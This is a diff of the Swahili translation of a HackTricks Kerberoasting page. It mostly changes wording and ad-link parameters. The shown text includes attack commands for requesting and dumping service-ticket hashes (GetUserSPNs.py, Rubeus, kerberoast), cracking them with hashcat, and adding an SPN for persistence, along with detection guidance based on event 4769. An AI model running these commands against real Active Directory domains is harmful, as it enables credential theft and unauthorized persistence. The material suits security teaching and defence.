@@ -3,22 +3,22 @@
 <figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
-Tumia [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kujenga na **kutumia workflows** kwa kutumia zana za **jamii ya juu zaidi** duniani.\
+Tumia [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=kerberoast) kujenga na **kutumia workflows** kwa kutumia zana za **jamii ya juu zaidi** duniani.\
 Pata Ufikiaji Leo:
 
-{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
+{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=kerberoast" %}
 
 <details>
 
-<summary><strong>Jifunze AWS hacking kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Jifunze kuhusu kuvamia AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
 Njia nyingine za kusaidia HackTricks:
 
-* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA USAJILI**](https://github.com/sponsors/carlospolop)!
+* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
 * Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
 * Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
 * **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Shiriki mbinu zako za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* **Shiriki mbinu zako za kuvamia kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
 
 </details>
 
@@ -31,15 +31,15 @@ Kwa kutekeleza **Kerberoasting**, akaunti ya kikoa inayoweza kuomba **TGS ticket
 ### Mambo Muhimu:
 
 * **Kerberoasting** inalenga **TGS tickets** kwa **huduma za akaunti za mtumiaji** ndani ya **AD**.
-* Tiketi zilizofichwa kwa kutumia funguo kutoka kwa **nywila za mtumiaji** zinaweza **kuvunjwa nje ya mtandao**.
+* Tiketi zilizofichwa kwa kutumia funguo za **nywila za mtumiaji** zinaweza **kuvunjwa nje ya mtandao**.
 * Huduma inatambuliwa na **ServicePrincipalName** ambayo si tupu.
 * **Hakuna mamlaka maalum** inayohitajika, ni **vyeti halali vya kikoa** tu vinavyohitajika.
 
 ### **Shambulio**
 
 {% hint style="warning" %}
-**Vyombo vya Kerberoasting** kawaida huiomba **`RC4 encryption`** wanapotekeleza shambulio na kuanzisha maombi ya TGS-REQ. Hii ni kwa sababu **RC4 ni** [**dhaifu**](https://www.stigviewer.com/stig/windows\_10/2017-04-28/finding/V-63795) na rahisi kuvunja nje ya mtandao kwa kutumia zana kama Hashcat kuliko algorithm nyingine za kufichua kama AES-128 na AES-256.\
-Hashi za RC4 (aina 23) huanza na **`$krb5tgs$23$*`** wakati AES-256 (aina 18) huanza na **`$krb5tgs$18$*`**`.
+**Zana za Kerberoasting** kawaida huiomba **`RC4 encryption`** wakati wa kutekeleza shambulio na kuanzisha maombi ya TGS-REQ. Hii ni kwa sababu **RC4 ni** [**dhaifu**](https://www.stigviewer.com/stig/windows\_10/2017-04-28/finding/V-63795) na rahisi kuvunja nje ya mtandao kwa kutumia zana kama Hashcat kuliko algoritimu nyingine za kufichua kama AES-128 na AES-256.\
+Vibambo vya RC4 (aina 23) huanza na **`$krb5tgs$23$*`** wakati AES-256 (aina 18) huanza na **`$krb5tgs$18$*`**`.
 {% endhint %}
 
 #### **Linux**
@@ -53,7 +53,7 @@ GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERN
 kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -o kerberoastable # 1. Enumerate kerberoastable users
 kerberoast spnroast 'kerberos+password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes # 2. Dump hashes
 ```
-Vifaa vya multi-matumizi ikiwa ni pamoja na dump ya watumiaji wanaoweza kuroastwa:
+Vifaa vya multi-vipengele ikiwa ni pamoja na dump ya watumiaji wanaoweza kuroast:
 ```bash
 # ADenum: https://github.com/SecuProject/ADenum
 adenum -d <DOMAIN.FULL> -ip <DC_IP> -u <USERNAME> -p <PASSWORD> -c
@@ -110,10 +110,10 @@ Wakati TGS inapoombwa, Windows tukio `4769 - Tiketi ya huduma ya Kerberos ilitak
 <figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
-Tumia [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) kujenga na **kutumia** mchakato wa kiotomatiki ulioendeshwa na zana za **jamii** za juu zaidi duniani.\
+Tumia [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=kerberoast) kujenga na **kutumia workflows** kwa urahisi zinazotumia zana za jamii za **juu kabisa** duniani.\
 Pata Ufikiaji Leo:
 
-{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
+{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=kerberoast" %}
 
 ### Kuvunja
 ```bash
@@ -123,26 +123,26 @@ hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
 ```
 ### Uthabiti
 
-Ikiwa una **ruhusa za kutosha** juu ya mtumiaji unaweza **kuifanya iwe inayoweza kuroastika**:
+Ikiwa una **ruhusa za kutosha** juu ya mtumiaji unaweza **kuifanya iwe inayoweza kuroastwa**:
 ```bash
 Set-DomainObject -Identity <username> -Set @{serviceprincipalname='just/whateverUn1Que'} -verbose
 ```
 Unaweza kupata **zana** muhimu kwa mashambulizi ya **kerberoast** hapa: [https://github.com/nidem/kerberoast](https://github.com/nidem/kerberoast)
 
-Ikiwa unapata **kosa** hili kutoka kwa Linux: **`Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)`** ni kwa sababu ya wakati wako wa eneo, unahitaji kusawazisha mwenyeji na DC. Kuna chaguo kadhaa:
+Ikiwa unapata **kosa** hili kutoka kwa Linux: **`Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)`** ni kwa sababu ya wakati wako wa eneo, unahitaji kusawazisha mwenyeji na DC. Kuna chaguzi chache:
 
 * `ntpdate <IP ya DC>` - Imepitwa na wakati kuanzia Ubuntu 16.04
 * `rdate -n <IP ya DC>`
 
 ### Kupunguza Hatari
 
-Kerberoasting inaweza kufanywa kwa kiwango kikubwa cha kificho ikiwa inaweza kuchexploit. Ili kugundua shughuli hii, tahadhari inapaswa kulipwa kwa **Tukio la Usalama ID 4769**, ambayo inaonyesha kuwa tiketi ya Kerberos imeombwa. Walakini, kutokana na mara nyingi kwa tukio hili, vichujio maalum lazima viwekezwe ili kuisolate shughuli za shaka:
+Kerberoasting inaweza kufanywa kwa kiwango kikubwa cha kificho ikiwa inaweza kuchexploit. Ili kugundua shughuli hii, tahadhari inapaswa kulipwa kwa **Tukio la Usalama ID 4769**, ambayo inaonyesha kuwa tiketi ya Kerberos imeombwa. Walakini, kutokana na mara kubwa ya tukio hili, vichujio maalum lazima viwekezwe ili kuisolate shughuli za shaka:
 
 * Jina la huduma isiwe **krbtgt**, kwani hii ni ombi la kawaida.
 * Majina ya huduma yanayoishia na **$** yanapaswa kuepukwa ili kuepuka kujumuisha akaunti za mashine zinazotumiwa kwa huduma.
-* Maombi kutoka kwa mashine yanapaswa kufutwa kwa kuepuka majina ya akaunti yaliyoandikwa kama **machine@domain**.
-* Ombi la tiketi lililofanikiwa pekee linapaswa kuzingatiwa, likitambuliwa na nambari ya kushindwa ya **'0x0'**.
-* **Muhimu zaidi**, aina ya kuchipua ya tiketi inapaswa kuwa **0x17**, ambayo mara nyingi hutumiwa katika mashambulizi ya Kerberoasting.
+* Maombi kutoka kwa mashine yanapaswa kufutwa kwa kutoa majina ya akaunti yaliyoandikwa kama **machine@domain**.
+* Ombi la tiketi lililofanikiwa pekee linapaswa kuzingatiwa, likitambuliwa na nambari ya kushindwa **'0x0'**.
+* **Muhimu zaidi**, aina ya kuchapisha tiketi inapaswa kuwa **0x17**, ambayo mara nyingi hutumiwa katika mashambulizi ya Kerberoasting.
 ```bash
 Get-WinEvent -FilterHashtable @{Logname='Security';ID=4769} -MaxEvents 1000 | ?{$_.Message.split("`n")[8] -ne 'krbtgt' -and $_.Message.split("`n")[8] -ne '*$' -and $_.Message.split("`n")[3] -notlike '*$@*' -and $_.Message.split("`n")[18] -like '*0x0*' -and $_.Message.split("`n")[17] -like "*0x17*"} | select ExpandProperty message
 ```
@@ -155,7 +155,7 @@ Kwa kutekeleza hatua hizi, mashirika yanaweza kupunguza kwa kiasi kikubwa hatari
 
 ## Kerberoast bila akaunti ya uwanjani
 
-Mnamo **Septemba 2022**, njia mpya ya kutumia mfumo ilifunuliwa na mtafiti aliyeitwa Charlie Clark, aliyeshiriki kupitia jukwaa lake [exploit.ph](https://exploit.ph/). Mbinu hii inaruhusu kupata **Tiketi za Huduma (ST)** kupitia ombi la **KRB\_AS\_REQ**, ambalo kwa kiasi kikubwa halihitaji udhibiti wowote juu ya akaunti yoyote ya Active Directory. Kimsingi, ikiwa mwakilishi amewekwa kwa njia ambayo haitaji uthibitishaji wa awali - hali inayofanana na inayojulikana katika uwanja wa usalama wa mtandao kama shambulio la **AS-REP Roasting** - sifa hii inaweza kutumika kubadilisha mchakato wa ombi. Hasa, kwa kubadilisha sifa ya **sname** ndani ya mwili wa ombi, mfumo unadanganywa kutoa **ST** badala ya Tiketi ya Kutoa Tiketi iliyofichwa kawaida (TGT).
+Mnamo **Septemba 2022**, njia mpya ya kutumia mfumo ilifunuliwa na mtafiti mmoja aliyeitwa Charlie Clark, aliyeshiriki kupitia jukwaa lake [exploit.ph](https://exploit.ph/). Mbinu hii inaruhusu kupata **Tiketi za Huduma (ST)** kupitia ombi la **KRB\_AS\_REQ**, ambalo kwa kiasi kikubwa halihitaji udhibiti wowote juu ya akaunti yoyote ya Active Directory. Kimsingi, ikiwa mwakilishi amewekwa kwa njia ambayo haitaji uwakilishi wa awali - hali inayofanana na inayojulikana katika uwanja wa usalama wa mtandao kama shambulio la **AS-REP Roasting** - sifa hii inaweza kutumika kubadilisha mchakato wa ombi. Hasa, kwa kubadilisha sifa ya **sname** ndani ya mwili wa ombi, mfumo unadanganywa kutoa **ST** badala ya Tiketi ya Kutoa Tiketi iliyofichwa kawaida (TGT).
 
 Mbinu hii imeelezewa kikamilifu katika makala hii: [Machapisho ya blogi ya Semperis](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/).
 
@@ -183,22 +183,22 @@ Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:"domain.local" /dc:"d
 
 <details>
 
-<summary><strong>Jifunze kuhusu kuvamia AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>
+<summary><strong>Jifunze kuhusu udukuzi wa AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalamu wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>
 
 Njia nyingine za kusaidia HackTricks:
 
-* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
+* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA USAJILI**](https://github.com/sponsors/carlospolop)!
 * Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
 * Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
-* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Shiriki mbinu zako za kuvamia kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
+* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au **kikundi cha** [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **Shiriki mbinu zako za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
 
 </details>
 
 <figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
-Tumia [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kujenga na **kutumia taratibu za kiotomatiki** zinazotumia zana za jamii **zinazoendelea zaidi** duniani.\
+Tumia [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=kerberoast) kujenga na **kutumia kiotomatiki** mifumo ya kazi inayotumia zana za jamii **za juu zaidi** duniani.\
 Pata Ufikiaji Leo:
 
-{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
+{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=kerberoast" %}
